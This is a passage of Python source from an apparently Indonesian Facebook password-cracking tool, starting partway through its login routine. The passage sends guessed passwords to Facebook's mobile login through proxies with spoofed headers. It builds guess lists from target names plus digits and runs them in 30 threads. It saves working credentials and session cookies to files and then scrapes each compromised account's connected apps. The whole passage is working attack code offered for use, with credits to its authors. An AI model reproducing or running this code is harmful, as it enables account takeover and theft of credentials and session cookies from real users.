			p = ses.get(f"https://{__janda__}/login/device-based/password/?uid={idf}&flow=login_no_pin&next=https://{__janda__}/?stype=lo&jlou=Afe2pwrty6VFbfaCvopivrLhvNKYmpj2i6XeX_wvcuc9w8BtAGH3J7L9M5AeDOG7zIGYT3gA8OENa0iQM3gfsEZL3MNYqMBQni6PcECO5-_gow&smuh=14918&lh=Ac-LUo_NkIUEKCso-p0&_rdr")
			dataa ={
					"lsd":re.search('name="lsd" value="(.*?)"', str(p.text)).group(1),
					"jazoest":re.search('name="jazoest" value="(.*?)"', str(p.text)).group(1),
					"uid":idf,
					"next":"https://"+__janda__+"/login/save-device/?next=https://mbasic.facebook.com/index.php?next=https%3A%2F%2Fmbasic.facebook.com%2F%3Ftbua%3D1%26__big_pipe_on__%26fb_dtsg_ag%3DAQw-uUJY-zsNiKTElXZcLC-O12MFNk6WFZgLTUI0wAvjezsE%253A0%253A0%26jazoest%3D24248&refsrc=deprecated",
					"flow":"login_no_pin",
					"pass":pw,
				}
			koki = (";").join([ "%s=%s" % (key, value) for key, value in p.cookies.get_dict().items() ])
			koki+=' m_pixel_ratio=2.625; wd=412x756'
			heade={
					"Host":"mbasic.facebook.com",
					"cache-control":"max-age=0",
					"upgrade-insecure-requests":"1",
					"origin":"https://"+__janda__,
					"content-type":"application/x-www-form-urlencoded",
					"user-agent":"Mozilla/5.0 (Linux; Android 8.0; Pixel XL Build/OPP3.170518.006) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.0 Mobile Safari/537.36 EdgA/41.1.35.1",
					"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9",
					"x-requested-with":"com.facebook.orca",
					"sec-ch-ua": '" Not A;Brand";v="99", "Chromium";v="101"',
					"sec-ch-ua-platform": '"Android"',
					"sec-ch-ua-mobile":"?1",
					"sec-fetch-site":"same-origin",
					"sec-fetch-mode":"cors",
					"sec-fetch-user":"?1",
					"sec-fetch-dest":"empty",
					"referer":f"https://{__janda__}/index.php?next=https%3A%2F%2F{__dev__}%2Ftools%2Fdebug%2Faccesstoken%2F",
					"accept-encoding":"gzip, deflate br",
					"accept-language":"en-GB,en-US;q=0.9,en;q=0.8"
				}
			po = ses.post(f"https://{__janda__}/login/device-based/validate-password/?shbl=0",data=dataa,cookies={"cookie": koki},headers=heade,allow_redirects=False,proxies=proxs)
			if "checkpoint" in po.cookies.get_dict().keys():
				print("\r%s╰───%s %s|%s              %s"%(P,KU,idf,pw,P))
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				headapp={"user-agent":"Opera/8.01 (J2ME/MIDP; Opera Mini/1.1.5005/hifi/tmobile/at; Nokia 5300; de; U; ssr)"}
				if 'no' in taplikasi:
					ok+=1
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					print("\r%s╰───%s %s|%s               \n%s%s"%(P,HA,idf,pw,kuki,P))     
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
					open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
					user=idf
					infoakun = ""
					session = requests.Session()
					cek2 = session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies=coki,headers=headapp).text
					cek =session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies=coki,headers=headapp).text
					apkaktif=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek))
					nok=1
					for muncul in apkaktif:
						infoakun+= (f"	{x}[{h}{nok}{x}] {b}{muncul[0]} {muncul[1]}{x}\n")
						nok+=1
					hit=0
					apkexp=re.findall('</i><div class=".*?"><span class=".*?">(.*?)</span><div></div><div class=".*?">(.*?)</div></div>',str(cek2))
					hit=0
					for muncul in apkexp:
						hit+=1
						infoakun += (f"	{x}[{k}{hit}{x}] {m}{muncul[0]} {muncul[1]}{x}\n")
					print("\r%s╰───%s %s|%s|%s\n%s%s"%(P,HA,idf,pw,kuki,infoakun,P))     
					ok+=1
					break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
########## INFORMASI TOOLS ##########
def informasi():
	print("\n%s#%s Developer"%(M,P))
	jalan("%s╰───%s Moch Aang Ardiansyah XD"%(H,P));time.sleep(1)
	print("\n%s#%s My team"%(M,P))
	jalan("%s╰───%s Jecko Ramadhan"%(H,P));time.sleep(1)
	jalan("%s╰───%s Hendri - YumasaaTzy"%(H,P));time.sleep(1)
	jalan("%s╰───%s Aldi Bactiar Rifai - Xenzi Gans"%(H,P));time.sleep(1)
	jalan("%s╰───%s Najib XD - Yuume"%(H,P));time.sleep(1)
	jalan("%s╰───%s Angga Adiy"%(H,P));time.sleep(1)
	jalan("%s╰───%s Fakhri - Mbokey Bhizer"%(H,P));time.sleep(1)
	jalan("%s╰───%s Mr Risky - Dumai 991"%(H,P));time.sleep(1)
	print("\n%s#%s Message me"%(M,P))
	jalan("%s╰───%s Jangan menjadi pelangi untuk orang yang buta warna"%(H,P));time.sleep(1)
	jalan("%s╰───%s Sekian, terimakasih atas dukungan anda"%(H,P));time.sleep(1)
	input("\n%s#%s Tekan enter untuk kembali "%(M,P));login()
########## PASSWORD TAMBAHAN ##########
def kunaon():
	print("\n%s#%s Crack berjalan"%(M,P))
	print("%s╰───%s Akun %sOK%s : %sOK/%s"%(H,P,H,P,H,okc))
	print("%s╰───%s Akun %sCP%s : %sOK/%s\n"%(H,P,K,P,K,cpc))
	with tred(max_workers=30) as pool:
		for AangXD in id2:
			idf,celeng = AangXD.split('|')[0],AangXD.split('|')[1].lower()
			__kiya__ = celeng.split(' ')[0]
			pwv = []
			if len(celeng)<6:
				if len(__kiya__)<3:
					pass
				else:
					pwv.append(__kiya__+'123')
					pwv.append(__kiya__+'1234')
					pwv.append(__kiya__+'12345')
					#pwv.append(__kiya__+'234')
					#pwv.append(__kiya__+'1122')
			else:
				if len(__kiya__)<3:
					pwv.append(celeng)
				else:
					pwv.append(celeng)
					pwv.append(__kiya__+'123')
					pwv.append(__kiya__+'1234')
					pwv.append(__kiya__+'12345')
					#pwv.append(__kiya__+'234')
					#pwv.append(__kiya__+'1122')
			if 'ya' in pwpluss:
				for xpwd in pwnya:
					pwv.append(xpwd)
			else:pass
			if 'mobile' in method:
				pool.submit(crack,idf,pwv)
			elif 'mbasic' in method:
				pool.submit(crackmbasic,idf,pwv)
			else:
				pool.submit(crackmbasic,idf,pwv)
	jalan("\n\n\n%s#%s Crack selesai"%(M,P))
	jalan("%s╰───%s Total akun %sOK : %s"%(H,P,H,ok));time.sleep(1)
	jalan("%s╰───%s Total akun %sCP : %s"%(H,P,K,cp));exit()
########## PROGRAM DONE ##########
if __name__=='__main__':
	os.system('clear');login()